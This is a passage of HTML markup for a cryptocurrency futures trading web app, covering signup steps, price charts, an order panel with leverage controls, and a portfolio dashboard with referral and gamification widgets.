            <label for="agreeTerms" style="cursor:pointer;line-height:1.5">I agree to the <span style="color:var(--green);cursor:pointer">Terms of Service</span> and <span style="color:var(--green);cursor:pointer">Privacy Policy</span></label>
          </div>
          <button class="btn-auth" onclick="signupNext1()">Continue â†’</button>
          <div class="auth-switch-text">Already have an account? <a onclick="showLayer('loginLayer')">Sign in</a></div>
        </div>

        <!-- STEP 2 -->
        <div id="signupStep2" style="display:none">
          <div class="auth-form-title">Secure Your Account</div>
          <div class="auth-form-sub">Choose a strong password and enable 2FA</div>
          <div id="signupAlert2" style="display:none"></div>
          <div class="form-group">
            <label class="form-label">Password</label>
            <div class="input-wrap"><span class="input-icon">ðŸ”’</span><input type="password" class="form-input" id="signupPwd" placeholder="Min 8 chars, 1 number, 1 symbol" oninput="checkPwdStrength(this.value)"><button class="input-eye" onclick="togglePwd('signupPwd',this)">ðŸ‘</button></div>
            <div class="pwd-strength">
              <div class="pwd-bar"><div class="pwd-fill" id="pwdFill"></div></div>
              <span id="pwdLabel" style="font-size:11px;color:var(--text3);min-width:40px">Weak</span>
            </div>
          </div>
          <div class="form-group">
            <label class="form-label">Confirm Password</label>
            <div class="input-wrap"><span class="input-icon">ðŸ”’</span><input type="password" class="form-input" id="signupPwd2" placeholder="Repeat password"><button class="input-eye" onclick="togglePwd('signupPwd2',this)">ðŸ‘</button></div>
          </div>
          <div class="form-group">
            <label class="form-label">Referral Code <span style="color:var(--text3);font-weight:400;text-transform:none;letter-spacing:0">(optional)</span></label>
            <div class="input-wrap"><span class="input-icon">ðŸŽ</span><input type="text" class="form-input" id="signupRef" placeholder="Enter referral code for bonus"></div>
          </div>
          <div style="display:flex;align-items:flex-start;gap:8px;margin-bottom:16px;font-size:12px;color:var(--text2)">
            <input type="checkbox" id="enable2FA" checked style="accent-color:var(--green);margin-top:2px">
            <label for="enable2FA" style="cursor:pointer;line-height:1.5">Enable 2FA via authenticator app <span style="color:var(--green);font-weight:700">(Recommended)</span></label>
          </div>
          <div style="display:flex;gap:8px">
            <button class="btn-auth-outline" onclick="signupBack1()">â† Back</button>
            <button class="btn-auth" onclick="signupNext2()" style="flex:1">Continue â†’</button>
          </div>
        </div>

        <!-- STEP 3 -->
        <div id="signupStep3" style="display:none">
          <div class="auth-form-title">Confirm Details</div>
          <div class="auth-form-sub">Review and complete your registration</div>
          <div class="confirm-box" id="confirmBox"></div>
          <div class="checkbox-row" style="margin-bottom:12px">
            <input type="checkbox" id="confirmMarketing" checked style="accent-color:var(--green)">
            <label for="confirmMarketing">Receive trading insights, market alerts, and exclusive offers</label>
          </div>
          <div style="display:flex;gap:8px">
            <button class="btn-auth-outline" onclick="signupBack2()">â† Back</button>
            <button class="btn-auth" id="signupFinalBtn" onclick="doSignup()" style="flex:1">
              <span id="signupFinalText">ðŸš€ Create Account</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• CHART LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="chartLayer">
  <div class="pair-bar">
    <div class="pair-bar-inner" id="pairBarInner"></div>
  </div>
  <div class="price-header">
    <div class="ph-left">
      <span class="ph-pair" id="chartPairLabel">BTC/USDT</span>
      <span class="ph-price up" id="chartPrice">$67,420.50</span>
      <span class="ph-change up" id="chartChange">+2.34%</span>
    </div>
    <div class="ph-stats" id="chartStats">
      <div class="ph-stat"><span class="ph-stat-lbl">24h High</span><span class="ph-stat-val text-green" id="chart24H">$68,120</span></div>
      <div class="ph-stat"><span class="ph-stat-lbl">24h Low</span><span class="ph-stat-val text-red" id="chart24L">$65,800</span></div>
      <div class="ph-stat"><span class="ph-stat-lbl">24h Volume</span><span class="ph-stat-val" id="chartVol">$2.4B</span></div>
      <div class="ph-stat"><span class="ph-stat-lbl">Market Cap</span><span class="ph-stat-val">$1.32T</span></div>
      <div class="ph-stat"><span class="ph-stat-lbl">Funding</span><span class="ph-stat-val text-green">+0.01%</span></div>
    </div>
    <div class="interval-btns" id="chartIntervals">
      <button class="iv-btn" onclick="setChartInterval('1m',this)">1m</button>
      <button class="iv-btn" onclick="setChartInterval('5m',this)">5m</button>
      <button class="iv-btn" onclick="setChartInterval('15m',this)">15m</button>
      <button class="iv-btn" onclick="setChartInterval('1h',this)">1H</button>
      <button class="iv-btn active" onclick="setChartInterval('4h',this)">4H</button>
      <button class="iv-btn" onclick="setChartInterval('1d',this)">1D</button>
      <button class="iv-btn" onclick="setChartInterval('1w',this)">1W</button>
    </div>
  </div>

  <div class="chart-layout">
    <!-- MAIN CHART -->
    <div class="chart-main">
      <div class="indicator-bar">
        <span style="font-size:11px;color:var(--text3);font-weight:600;margin-right:4px">Indicators:</span>
        <button class="ind-btn active" onclick="toggleIndicator('MA',this)">MA</button>
        <button class="ind-btn active" onclick="toggleIndicator('EMA',this)">EMA</button>
        <button class="ind-btn" onclick="toggleIndicator('BB',this)">BB</button>
        <button class="ind-btn" onclick="toggleIndicator('RSI',this)">RSI</button>
        <button class="ind-btn" onclick="toggleIndicator('MACD',this)">MACD</button>
        <button class="ind-btn" onclick="toggleIndicator('VWAP',this)">VWAP</button>
        <button class="ind-btn" onclick="toggleIndicator('Ichimoku',this)">Ichimoku</button>
        <span style="margin-left:auto;font-size:11px;color:var(--text3);cursor:pointer" onclick="showToast('ðŸ“Š Drawing tools coming soon!','blue')">âœï¸ Draw</span>
        <span style="font-size:11px;color:var(--text3);margin-left:8px;cursor:pointer" onclick="showToast('ðŸ“¸ Chart screenshot saved!','green')">ðŸ“¸ Screenshot</span>
      </div>
      <div id="tvChartContainer" style="flex:1;min-height:0"></div>
      <div class="depth-section">
        <div style="font-size:11px;font-weight:700;color:var(--text2);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px">Market Depth</div>
        <div class="depth-wrap"><canvas id="depthCanvas"></canvas></div>
      </div>
    </div>

    <!-- ORDER BOOK -->
    <div class="orderbook-panel">
      <div class="ob-header">
        <span class="ob-title">Order Book</span>
        <div style="display:flex;gap:4px">
          <div style="width:14px;height:14px;background:var(--red2);border:1px solid var(--border);border-radius:2px;cursor:pointer" title="Asks only"></div>
          <div style="width:14px;height:14px;background:linear-gradient(var(--red2),var(--green3));border:1px solid var(--border);border-radius:2px;cursor:pointer" title="Both"></div>
          <div style="width:14px;height:14px;background:var(--green3);border:1px solid var(--border);border-radius:2px;cursor:pointer" title="Bids only"></div>
        </div>
      </div>
      <div class="ob-labels"><span>Price (USDT)</span><span style="text-align:center">Amount (BTC)</span><span>Total</span></div>
      <div class="ob-asks" id="obAsks"></div>
      <div class="ob-spread">
        <span class="ob-spread-price" id="obSpreadPrice">$67,420.50</span>
        <span class="ob-spread-pct" id="obSpreadPct">Spread: 0.01%</span>
      </div>
      <div class="ob-bids" id="obBids"></div>
    </div>

    <!-- TRADES PANEL -->
    <div class="trades-panel">
      <div class="ob-header">
        <span class="ob-title">Recent Trades</span>
        <span style="font-size:10px;color:var(--text3)">Real-time</span>
      </div>
      <div class="tp-labels"><span>Price</span><span style="text-align:center">Amount</span><span>Time</span></div>
      <div class="tp-feed" id="tpFeed"></div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• TRADING LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="tradingLayer">
  <div class="funding-strip">
    <div class="funding-item"><span class="funding-lbl">Funding Rate</span><span class="funding-val text-green">+0.0100%</span></div>
    <div class="funding-item"><span class="funding-lbl">Next Funding</span><span class="funding-val funding-timer" id="fundingTimer">07:42:18</span></div>
    <div class="funding-item"><span class="funding-lbl">Open Interest</span><span class="funding-val">$8.42B</span></div>
    <div class="funding-item"><span class="funding-lbl">Index Price</span><span class="funding-val" id="tradingIndexPrice">$67,415.20</span></div>
    <div class="funding-item"><span class="funding-lbl">Mark Price</span><span class="funding-val" id="tradingMarkPrice">$67,420.50</span></div>
    <div class="funding-item"><span class="funding-lbl">Insurance Fund</span><span class="funding-val">$500M</span></div>
    <div class="long-short-bar">
      <div class="ls-label-row"><span class="ls-long-label">Long <span id="lsPct">64%</span></span><span class="ls-short-label">Short 36%</span></div>
      <div class="ls-bar"><div class="ls-long-fill" id="lsFill" style="width:64%"></div></div>
    </div>
  </div>

  <div class="trade-price-strip">
    <span class="tps-pair">BTC/USDT PERP</span>
    <span class="tps-price text-green" id="tpsPrice">$67,420.50</span>
    <span class="tps-chg up" id="tpsChg">+2.34%</span>
    <div class="tps-stats">
      <div class="tps-stat"><span class="tps-lbl">24h High</span><span class="tps-val text-green" id="tps24H">$68,120</span></div>
      <div class="tps-stat"><span class="tps-lbl">24h Low</span><span class="tps-val text-red" id="tps24L">$65,800</span></div>
      <div class="tps-stat"><span class="tps-lbl">24h Volume</span><span class="tps-val" id="tpsVol">2.4B USDT</span></div>
      <div class="tps-stat"><span class="tps-lbl">Liq. Price</span><span class="tps-val text-red" id="tpsLiq">â€”</span></div>
    </div>
    <div class="tps-bal">
      <span class="tps-lbl">Available Balance</span>
      <span class="tps-val" id="tpsBal">$12,500.00 USDT</span>
    </div>
  </div>

  <div class="trading-body">
    <!-- CHART COL -->
    <div class="trade-chart-col">
      <div class="pair-bar" style="border-bottom:1px solid var(--border)">
        <div class="pair-bar-inner" id="tradePairBar"></div>
      </div>
      <div id="tvTradingChart" style="flex:1;min-height:300px"></div>
    </div>

    <!-- ORDER PANEL -->
    <div class="order-panel">
      <div class="order-tabs">
        <button class="ot-btn buy active" id="otBuy" onclick="setOrderSide('buy')">BUY / LONG</button>
        <button class="ot-btn sell" id="otSell" onclick="setOrderSide('sell')">SELL / SHORT</button>
      </div>
      <div class="order-type-row">
        <button class="order-type-btn active" onclick="setOrderType('limit',this)">Limit</button>
        <button class="order-type-btn" onclick="setOrderType('market',this)">Market</button>
        <button class="order-type-btn" onclick="setOrderType('stop',this)">Stop</button>
        <button class="order-type-btn" onclick="setOrderType('tp_sl',this)">TP/SL</button>
      </div>

      <div class="op-group">
        <div class="op-label"><span>Leverage</span><span class="op-leverage-val" id="leverageVal">10x</span></div>
        <input type="range" class="leverage-slider" id="leverageSlider" min="1" max="100" value="10" oninput="updateLeverage(this.value)">
        <div class="leverage-marks">
          <span onclick="setLeverage(1)">1x</span>
          <span onclick="setLeverage(5)">5x</span>
          <span onclick="setLeverage(10)">10x</span>
          <span onclick="setLeverage(25)">25x</span>
          <span onclick="setLeverage(50)">50x</span>
          <span onclick="setLeverage(100)">100x</span>
        </div>
      </div>

      <div class="op-group">
        <div class="op-label"><span>Price (USDT)</span></div>
        <div class="op-input-wrap">
          <input type="number" class="op-input" id="orderPrice" placeholder="67420.50" value="67420.50">
          <span class="op-input-suffix">USDT</span>
        </div>
      </div>

      <div class="op-group">
        <div class="op-label"><span>Amount (BTC)</span><span id="orderUSDVal" style="color:var(--text3);font-size:11px;font-family:var(--font-mono)">â‰ˆ $0</span></div>
        <div class="op-input-wrap">
          <input type="number" class="op-input" id="orderAmt" placeholder="0.001" oninput="calcOrderUSD()">
          <span class="op-input-suffix">BTC</span>
        </div>
        <div class="quick-pct-row">
          <button class="qp-btn" onclick="setOrderPct(25)">25%</button>
          <button class="qp-btn" onclick="setOrderPct(50)">50%</button>
          <button class="qp-btn" onclick="setOrderPct(75)">75%</button>
          <button class="qp-btn" onclick="setOrderPct(100)">MAX</button>
        </div>
      </div>

      <div class="op-group">
        <div class="op-label"><span>Take Profit</span><span style="color:var(--text3);font-size:10px">Optional</span></div>
        <div class="op-input-wrap">
          <input type="number" class="op-input" id="orderTP" placeholder="Target price">
          <span class="op-input-suffix">USDT</span>
        </div>
      </div>

      <div class="op-group">
        <div class="op-label"><span>Stop Loss</span><span style="color:var(--text3);font-size:10px">Optional</span></div>
        <div class="op-input-wrap">
          <input type="number" class="op-input" id="orderSL" placeholder="Stop price">
          <span class="op-input-suffix">USDT</span>
        </div>
      </div>

      <!-- RISK CALCULATOR -->
      <div class="risk-calc">
        <div style="font-size:11px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px">Risk Calculator</div>
        <div class="risk-meter"><div class="risk-fill" id="riskFill" style="width:30%;background:var(--green)"></div></div>
        <div style="display:flex;justify-content:space-between;font-size:10px;font-family:var(--font-mono)">
          <span style="color:var(--text3)">Risk Level</span>
          <span id="riskLabel" style="color:var(--green)">Low Risk</span>
        </div>
      </div>

      <div class="liq-warning-bar" id="liqWarning">âš ï¸ <span id="liqWarnText">Liquidation price approaching â€” reduce size or add margin</span></div>

      <div class="order-summary">
        <div class="os-row"><span>Order Value</span><span id="osSumVal">$0.00</span></div>
        <div class="os-row"><span>Required Margin</span><span id="osSumMargin">$0.00</span></div>
        <div class="os-row"><span>Est. Liquidation</span><span id="osSumLiq" style="color:var(--red)">â€”</span></div>
        <div class="os-row"><span>Trading Fee</span><span id="osSumFee">$0.00</span></div>
        <div class="os-row"><span>Potential Profit</span><span id="osSumProfit" style="color:var(--green)">â€”</span></div>
      </div>

      <div class="risk-warning">âš ï¸ Leverage trading involves substantial risk. Trade responsibly.</div>

      <div class="op-mode-row">
        <button class="op-mode-btn active" onclick="setMarginMode('cross',this)">Cross</button>
        <button class="op-mode-btn" onclick="setMarginMode('isolated',this)">Isolated</button>
        <span style="margin-left:auto;font-size:10px;color:var(--text3)">Hedge Mode</span>
        <input type="checkbox" style="accent-color:var(--green)" id="hedgeModeToggle">
      </div>

      <button class="order-submit-btn buy" id="orderSubmitBtn" onclick="submitOrder()">BUY / LONG BTC</button>
    </div>

    <!-- RIGHT COL: mini OB + positions -->
    <div class="trade-right-col">
      <div class="mini-ob">
        <div class="mob-header">Order Book</div>
        <div class="ob-labels" style="padding:4px 10px"><span>Price</span><span style="text-align:center">Size</span><span></span></div>
        <div id="miniObAsks" style="max-height:100px;overflow:hidden"></div>
        <div style="padding:5px 10px;background:var(--bg2);border-top:1px solid var(--border);border-bottom:1px solid var(--border)">
          <span class="ob-spread-price" style="font-size:13px" id="miniObMid">$67,420.50</span>
        </div>
        <div id="miniObBids" style="max-height:100px;overflow:hidden"></div>
      </div>
      <div class="my-positions">
        <div style="padding:8px 12px;font-size:12px;font-weight:700;font-family:var(--font-display);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
          My Positions
          <span style="font-size:10px;color:var(--text3)" id="posCount">0 open</span>
        </div>
        <div id="myPositionsList">
          <div class="empty-state" style="padding:20px 12px">
            <div style="font-size:24px;margin-bottom:6px">ðŸ“­</div>
            <div style="font-size:12px;color:var(--text3)">No open positions</div>
            <div style="font-size:11px;color:var(--text3);margin-top:2px">Place a trade to get started</div>
          </div>
        </div>
      </div>
      <div style="padding:8px 10px;border-top:1px solid var(--border)">
        <div style="font-size:11px;font-weight:700;color:var(--text2);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px">Recent Trades</div>
        <div id="miniTradesFeed" style="max-height:120px;overflow:hidden"></div>
      </div>
    </div>
  </div>

  <!-- OPEN ORDERS TABLE -->
  <div style="padding:0 0 16px;background:var(--bg0)">
    <div style="background:var(--bg1);border-top:1px solid var(--border)">
      <div style="display:flex;gap:0;border-bottom:1px solid var(--border)">
        <button style="padding:10px 16px;background:transparent;border:none;border-bottom:2px solid var(--green);color:var(--green);font-size:12px;font-weight:700;cursor:pointer;font-family:var(--font-mono)">Open Orders (0)</button>
        <button style="padding:10px 16px;background:transparent;border:none;border-bottom:2px solid transparent;color:var(--text3);font-size:12px;font-weight:700;cursor:pointer;font-family:var(--font-mono)" onclick="showTradeHistory()">Trade History</button>
        <button style="padding:10px 16px;background:transparent;border:none;border-bottom:2px solid transparent;color:var(--text3);font-size:12px;font-weight:700;cursor:pointer;font-family:var(--font-mono)">Position History</button>
        <button style="padding:10px 16px;background:transparent;border:none;border-bottom:2px solid transparent;color:var(--text3);font-size:12px;font-weight:700;cursor:pointer;font-family:var(--font-mono)">Assets</button>
      </div>
      <div id="openOrdersContent" style="padding:16px;text-align:center;color:var(--text3);font-size:13px">
        <div style="font-size:28px;margin-bottom:8px">ðŸ“‹</div>No open orders
      </div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• DASHBOARD LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="dashboardLayer">
  <div class="dash-body">
    <!-- SIDEBAR -->
    <div class="dash-sidebar">
      <div class="sidebar-balance">
        <div class="sbl-label">Total Portfolio</div>
        <div class="sbl-amount" id="sidebarBalance">$12,500.00</div>
        <div class="sbl-sub" id="sidebarBalanceSub">+$420.50 today (+3.48%)</div>
        <div class="mode-toggle" style="margin-bottom:10px">
          <button class="mt-btn active" id="mtLive" onclick="setTradingMode('live')">LIVE</button>
          <button class="mt-btn" id="mtDemo" onclick="setTradingMode('demo')">DEMO</button>
        </div>
        <button class="btn btn-green" style="width:100%;margin-bottom:6px" onclick="showLayer('depositLayer')">+ Deposit</button>
        <button class="btn btn-outline" style="width:100%;font-size:12px" onclick="showWithdrawModal()">â†‘ Withdraw</button>
      </div>
      <nav class="sidebar-nav">
        <div class="snav-section">Main</div>
        <div class="snav-item active" onclick="showDashSection('overview');setSnav(this)"><span class="snav-icon">ðŸ“Š</span>Overview</div>
        <div class="snav-item" onclick="showLayer('tradingLayer');setSnav(this)"><span class="snav-icon">âš¡</span>Trade</div>
        <div class="snav-item" onclick="showLayer('chartLayer');setSnav(this)"><span class="snav-icon">ðŸ“ˆ</span>Charts</div>
        <div class="snav-item" onclick="showDashSection('positions');setSnav(this)"><span class="snav-icon">ðŸ’¼</span>Positions<span class="snav-badge" id="posBadge">2</span></div>
        <div class="snav-item" onclick="showDashSection('history');setSnav(this)"><span class="snav-icon">ðŸ“‹</span>History</div>
        <div class="snav-section">Tools</div>
        <div class="snav-item" onclick="showLayer('signalsLayer');setSnav(this)"><span class="snav-icon">ðŸŽ¯</span>Signals<span class="snav-badge">5</span></div>
        <div class="snav-item" onclick="showLayer('botsLayer');setSnav(this)"><span class="snav-icon">ðŸ¤–</span>Bots</div>
        <div class="snav-item" onclick="showLayer('copyTradingLayer');setSnav(this)"><span class="snav-icon">ðŸ‘¥</span>Copy Trade</div>
        <div class="snav-item" onclick="showLayer('heatmapLayer');setSnav(this)"><span class="snav-icon">ðŸŒ¡ï¸</span>Heatmap</div>
        <div class="snav-section">Account</div>
        <div class="snav-item" onclick="showLayer('depositLayer');setSnav(this)"><span class="snav-icon">ðŸ’³</span>Deposit</div>
        <div class="snav-item" onclick="showDashSection('referral');setSnav(this)"><span class="snav-icon">ðŸŽ</span>Referral</div>
        <div class="snav-item" onclick="showLayer('achievementsLayer');setSnav(this)"><span class="snav-icon">ðŸ†</span>Achievements</div>
        <div class="snav-item" onclick="showDashSection('settings');setSnav(this)"><span class="snav-icon">âš™ï¸</span>Settings</div>
        <div class="snav-item" onclick="doLogout()"><span class="snav-icon">ðŸšª</span>Sign Out</div>
      </nav>
      <div class="sidebar-ref-card">
        <div style="font-size:11px;font-weight:700;color:var(--text1);margin-bottom:4px">ðŸŽ Refer & Earn</div>
        <div class="src-link" id="sidebarRefLink">cryptopro.io/ref/USER123</div>
        <button class="src-copy" onclick="copyRefLink()">ðŸ“‹ Copy Link</button>
      </div>
    </div>

    <!-- MAIN CONTENT -->
    <div class="dash-content" id="dashContent">

      <!-- KYC NOTICE -->
      <div class="kyc-notice" id="kycNotice">
        <div>
          <div style="font-weight:700;font-size:14px;margin-bottom:3px">âš ï¸ Verify Your Identity to Unlock All Features</div>
          <div style="font-size:12px;color:var(--text2)">Complete KYC to enable withdrawals, higher limits, and VIP perks</div>
        </div>
        <button class="kyc-btn" onclick="startKYC()">Verify Now â†’</button>
      </div>

      <!-- BALANCE CARDS -->
      <div class="balance-cards">
        <div class="bal-card primary">
          <div class="bc-label">Total Balance</div>
          <div class="bc-amount text-green" id="dashTotalBal">$12,500.00</div>
          <div class="bc-change up" id="dashTotalChg">+$420.50 today</div>
          <div style="margin-top:12px;height:40px;position:relative"><canvas id="balMiniChart"></canvas></div>
        </div>
        <div class="bal-card">
          <div class="bc-label">Available</div>
          <div class="bc-amount">$8,250.00</div>
          <div class="bc-change up">Ready to trade</div>
        </div>
        <div class="bal-card">
          <div class="bc-label">In Positions</div>
          <div class="bc-amount">$3,840.00</div>
          <div class="bc-change up">+$180.20</div>
        </div>
        <div class="bal-card">
          <div class="bc-label">Unrealized PnL</div>
          <div class="bc-amount text-green" id="dashUnrealPnl">+$410.00</div>
          <div class="bc-change up">+3.48%</div>
        </div>
      </div>

      <!-- QUICK ACTIONS -->
      <div class="quick-actions">
        <div class="qa-btn qa-trade" onclick="showLayer('tradingLayer')"><div class="qa-icon">âš¡</div>Trade</div>
        <div class="qa-btn qa-deposit" onclick="showLayer('depositLayer')"><div class="qa-icon">ðŸ’³</div>Deposit</div>
        <div class="qa-btn qa-withdraw" onclick="showWithdrawModal()"><div class="qa-icon">â†‘</div>Withdraw</div>
        <div class="qa-btn qa-bots" onclick="showLayer('botsLayer')"><div class="qa-icon">ðŸ¤–</div>Bots</div>
        <div class="qa-btn qa-ref" onclick="showDashSection('referral')"><div class="qa-icon">ðŸŽ</div>Refer</div>
        <div class="qa-btn qa-charts" onclick="showLayer('chartLayer')"><div class="qa-icon">ðŸ“Š</div>Charts</div>
        <div class="qa-btn qa-copy" onclick="showLayer('copyTradingLayer')"><div class="qa-icon">ðŸ‘¥</div>Copy</div>
      </div>

      <!-- OVERVIEW SECTION -->
      <div id="dashSectionOverview">
        <div class="dash-two-col">
          <!-- PERFORMANCE CHART -->
          <div class="dash-card">
            <div class="dc-header">
              <span class="dc-title">Portfolio Performance</span>
              <div class="dc-tabs">
                <button class="dc-tab active" onclick="setPerfPeriod('7d',this)">7D</button>
                <button class="dc-tab" onclick="setPerfPeriod('30d',this)">30D</button>
                <button class="dc-tab" onclick="setPerfPeriod('90d',this)">90D</button>
                <button class="dc-tab" onclick="setPerfPeriod('1y',this)">1Y</button>
              </div>
            </div>
            <div class="dc-chart-wrap"><canvas id="perfChart"></canvas></div>
            <div class="perf-footer">
              <div class="pf-item"><span class="pf-lbl">Total Return</span><span class="pf-val text-green">+24.8%</span></div>
              <div class="pf-item"><span class="pf-lbl">Best Day</span><span class="pf-val text-green">+$1,240</span></div>
              <div class="pf-item"><span class="pf-lbl">Win Rate</span><span class="pf-val">73.2%</span></div>
            </div>
          </div>

          <!-- ALLOCATION -->
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">Asset Allocation</span><span class="dc-badge">7 assets</span></div>
            <div class="alloc-chart-wrap">
              <canvas id="allocChart"></canvas>
              <div class="alloc-center"><span class="ac-amount">$12,500</span><span class="ac-label">Total</span></div>
            </div>
            <div class="alloc-legend" id="allocLegend"></div>
          </div>
        </div>

        <div class="dash-three-col">
          <!-- OPEN POSITIONS -->
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">Open Positions</span><span class="dc-link" onclick="showDashSection('positions')">View all â†’</span></div>
            <div id="dashPositions"></div>
          </div>

          <!-- RECENT TRADES -->
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">Recent Trades</span><span class="dc-link" onclick="showDashSection('history')">Full history â†’</span></div>
            <div id="dashRecentTrades"></div>
          </div>

          <!-- MARKET SNAPSHOT -->
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">Market Snapshot</span></div>
            <div class="msnap-list" id="dashMarketSnap"></div>
          </div>
        </div>

        <!-- LIVE TX + GAMIFICATION -->
        <div class="dash-two-col">
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">Live Activity</span><span class="section-badge" style="animation:pulse 2s infinite">LIVE</span></div>
            <div class="live-tx-feed" id="liveTxFeed"></div>
          </div>
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">Daily Streak ðŸ”¥</span></div>
            <div class="streak-display">
              <div class="streak-flame">ðŸ”¥</div>
              <div>
                <div style="font-size:11px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.5px">Current Streak</div>
                <div class="streak-days" id="streakDays">7</div>
                <div style="font-size:11px;color:var(--text2)">days in a row</div>
              </div>
              <div style="margin-left:auto;text-align:right">
                <div style="font-size:11px;color:var(--text3);margin-bottom:4px">This week</div>
                <div class="streak-dots" id="streakDots"></div>
              </div>
            </div>
            <div class="challenge-card">
              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">
                <div style="font-size:13px;font-weight:800;color:var(--purple);font-family:var(--font-display)">âš¡ Daily Challenge</div>
                <span class="challenge-timer" id="challengeTimer">Resets in 14:22:08</span>
              </div>
              <div style="font-size:12px;color:var(--text2);margin-bottom:8px">Complete 3 trades today to earn <strong style="color:var(--yellow)">+50 XP</strong> and a <strong style="color:var(--green)">$5 reward</strong></div>
              <div class="challenge-progress"><div class="challenge-fill" id="challengeFill" style="width:33%"></div></div>
              <div style="display:flex;justify-content:space-between;font-size:10px;font-family:var(--font-mono)">
                <span style="color:var(--text3)">1/3 completed</span>
                <span style="color:var(--purple)">+50 XP on completion</span>
              </div>
            </div>
          </div>
        </div>

        <!-- RECOMMENDED ACTIONS -->
        <div class="dash-card">
          <div class="dc-header"><span class="dc-title">ðŸŽ¯ Recommended Actions</span><span class="dc-badge">AI-powered</span></div>
          <div id="recActions"></div>
        </div>
      </div>

      <!-- POSITIONS SECTION -->
      <div id="dashSectionPositions" style="display:none">
        <div class="dash-card">
          <div class="dc-header"><span class="dc-title">Open Positions</span><span class="dc-badge" id="posCardBadge">2 active</span></div>
          <div id="positionsList"></div>
        </div>
        <div class="dash-card">
          <div class="dc-header"><span class="dc-title">Position History</span></div>
          <table style="width:100%;border-collapse:collapse">
            <thead><tr style="font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px">
              <th style="padding:8px 12px;text-align:left;font-weight:600">Pair</th>
              <th style="padding:8px 12px;text-align:left;font-weight:600">Type</th>
              <th style="padding:8px 12px;text-align:right;font-weight:600">PnL</th>
              <th style="padding:8px 12px;text-align:right;font-weight:600">ROI</th>
              <th style="padding:8px 12px;text-align:right;font-weight:600">Closed</th>
            </tr></thead>
            <tbody id="posHistoryBody"></tbody>
          </table>
        </div>
      </div>

      <!-- HISTORY SECTION -->
      <div id="dashSectionHistory" style="display:none">
        <div class="dash-card">
          <div class="dc-header">
            <span class="dc-title">Trade History</span>
            <div style="display:flex;gap:8px;align-items:center">
              <select style="padding:5px 10px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-sm);color:var(--text1);font-size:12px;font-family:var(--font-body)">
                <option>All Pairs</option><option>BTC/USDT</option><option>ETH/USDT</option><option>SOL/USDT</option>
              </select>
              <button class="btn btn-outline" style="font-size:11px;padding:5px 12px" onclick="showToast('ðŸ“¥ Exporting trade history...','blue')">Export CSV</button>
            </div>
          </div>
          <table style="width:100%;border-collapse:collapse">
            <thead><tr style="font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border)">
              <th style="padding:8px 12px;text-align:left;font-weight:600">Date</th>
              <th style="padding:8px 12px;text-align:left;font-weight:600">Pair</th>
              <th style="padding:8px 12px;text-align:left;font-weight:600">Side</th>
              <th style="padding:8px 12px;text-align:right;font-weight:600">Price</th>
              <th style="padding:8px 12px;text-align:right;font-weight:600">Amount</th>
              <th style="padding:8px 12px;text-align:right;font-weight:600">PnL</th>
            </tr></thead>
            <tbody id="tradeHistoryBody"></tbody>
          </table>
        </div>
      </div>

      <!-- REFERRAL SECTION -->
      <div id="dashSectionReferral" style="display:none">
        <div class="dash-two-col">
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">ðŸŽ Referral Program</span></div>
            <div style="text-align:center;padding:16px 0">
              <div style="font-size:40px;margin-bottom:8px">ðŸ’°</div>
              <div style="font-family:var(--font-mono);font-size:36px;font-weight:900;color:var(--green)">$25</div>
              <div style="font-size:14px;color:var(--text2);margin-bottom:16px">per referred friend who deposits $100+</div>
              <div style="background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-lg);padding:12px 16px;display:flex;align-items:center;gap:10px;margin-bottom:12px">
                <span style="font-family:var(--font-mono);font-size:13px;flex:1;text-align:left" id="refLinkDisplay">cryptopro.io/ref/USER123</span>
                <button class="btn btn-green" style="font-size:12px;padding:6px 14px" onclick="copyRefLink()">Copy</button>
              </div>
              <div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap">
                <button class="btn btn-outline" onclick="shareRef('twitter')">ðŸ¦ Share on X</button>
                <button class="btn btn-outline" onclick="shareRef('telegram')">âœˆï¸ Telegram</button>
                <button class="btn btn-outline" onclick="shareRef('whatsapp')">ðŸ’¬ WhatsApp</button>
              </div>
            </div>
          </div>
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">Referral Stats</span></div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px">
              <div style="background:var(--bg2);border-radius:var(--r-lg);padding:14px;text-align:center">
                <div style="font-family:var(--font-mono);font-size:24px;font-weight:800;color:var(--green)" id="refTotalEarned">$125</div>
                <div style="font-size:11px;color:var(--text3);margin-top:3px">Total Earned</div>
              </div>
              <div style="background:var(--bg2);border-radius:var(--r-lg);padding:14px;text-align:center">
                <div style="font-family:var(--font-mono);font-size:24px;font-weight:800" id="refTotalReferrals">5</div>
                <div style="font-size:11px;color:var(--text3);margin-top:3px">Total Referrals</div>
              </div>
              <div style="background:var(--bg2);border-radius:var(--r-lg);padding:14px;text-align:center">
